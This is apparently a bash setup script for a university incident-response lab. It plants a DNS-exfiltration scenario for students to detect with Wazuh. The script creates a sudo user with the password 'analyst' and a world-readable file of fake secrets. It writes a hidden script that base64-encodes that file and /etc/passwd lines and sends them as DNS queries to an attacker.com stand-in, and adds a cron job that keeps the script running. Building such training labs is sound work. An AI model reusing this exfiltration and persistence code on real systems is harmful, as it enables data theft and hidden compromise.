#!/bin/bash
# Chay LAN DAU tren target, quyen user 'ubuntu'. $1 = mat khau sudo.
PW="$1"

# 1. Tao user analyst cho sinh vien SSH sang xu ly su co (mat khau: analyst)
echo "$PW" | sudo -S useradd -m -s /bin/bash analyst 2>/dev/null
echo "$PW" | sudo -S bash -c 'echo "analyst:analyst" | chpasswd'
echo "$PW" | sudo -S usermod -aG sudo analyst 2>/dev/null

# 2. Tao file du lieu nhay cam /opt/company/secret_vault.txt (quyen 644 bi lo)
echo "$PW" | sudo -S mkdir -p /opt/company
echo "$PW" | sudo -S bash -c 'cat > /opt/company/secret_vault.txt <<EOF
FLAG_SECRET=PTIT_DNS_EXFIL_VAULT_EXID
CUSTOMER_CARD_1=4532-9981-2234-0012
CUSTOMER_CARD_2=5412-7765-8890-1123
API_PRIVATE_KEY=sk_live_998877665544332211_ptit
EOF'
echo "$PW" | sudo -S chmod 644 /opt/company/secret_vault.txt

# 3. Tao script ma doc .dns_exfil.sh ma hoa Base64 du lieu nhay cam va gui qua DNS Subdomain
echo "$PW" | sudo -S bash -c 'cat > /usr/local/bin/.dns_exfil.sh <<'"'"'EOF'"'"'
#!/bin/bash
DNS_C2="172.20.0.5"
DOMAIN="exfil-EXID.attacker.com"
LOG="/var/log/dns-queries.log"

while true; do
  if [ -r /opt/company/secret_vault.txt ]; then
    while IFS= read -r line; do
      [ -z "$line" ] && continue
      B64=$(echo -n "$line" | base64 | tr -d "=\n")
      QUERY="${B64}.${DOMAIN}"
      echo "$(date "+%b %d %H:%M:%S") target dns-client[$$]: query[A] ${QUERY} from 172.20.0.10 to ${DNS_C2}" >> "$LOG"
      dig @"${DNS_C2}" "${QUERY}" +short +time=1 +tries=1 >/dev/null 2>&1 || true
      sleep 1
    done < /opt/company/secret_vault.txt
  fi

  # Gui kem 3 dong dau /etc/passwd qua DNS
  head -n 3 /etc/passwd | while IFS= read -r pline; do
    B64P=$(echo -n "$pline" | base64 | tr -d "=\n")
    QUERY="${B64P}.${DOMAIN}"
    echo "$(date "+%b %d %H:%M:%S") target dns-client[$$]: query[A] ${QUERY} from 172.20.0.10 to ${DNS_C2}" >> "$LOG"
    dig @"${DNS_C2}" "${QUERY}" +short +time=1 +tries=1 >/dev/null 2>&1 || true
    sleep 1
  done
  sleep 8
done
EOF'
echo "$PW" | sudo -S chmod +x /usr/local/bin/.dns_exfil.sh

# 4. Tao persistence cronjob /etc/cron.d/dns-sync de tu khoi dong lai ma doc neu chua xoa cron
echo "$PW" | sudo -S bash -c 'cat > /etc/cron.d/dns-sync <<EOF
* * * * * ubuntu pgrep -f .dns_exfil.sh >/dev/null || nohup /bin/bash /usr/local/bin/.dns_exfil.sh >/dev/null 2>&1 &
EOF'
echo "$PW" | sudo -S chmod 644 /etc/cron.d/dns-sync

# 5. Cau hinh Wazuh Agent giam sat /var/log/dns-queries.log
echo "$PW" | sudo -S touch /var/log/dns-queries.log
echo "$PW" | sudo -S chmod 666 /var/log/dns-queries.log
echo "$PW" | sudo -S bash -c 'cat >> /var/ossec/etc/ossec.conf <<EOF
<ossec_config>
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/dns-queries.log</location>
  </localfile>
</ossec_config>
EOF' 2>/dev/null || true

# 6. Khoi dong cron, wazuh-agent va ma doc exfil ngam
echo "$PW" | sudo -S systemctl restart cron 2>/dev/null || echo "$PW" | sudo -S service cron restart 2>/dev/null || true
echo "$PW" | sudo -S systemctl restart wazuh-agent 2>/dev/null || echo "$PW" | sudo -S service wazuh-agent restart 2>/dev/null || true
setsid /bin/bash /usr/local/bin/.dns_exfil.sh >/dev/null 2>&1 < /dev/null &

exit 0
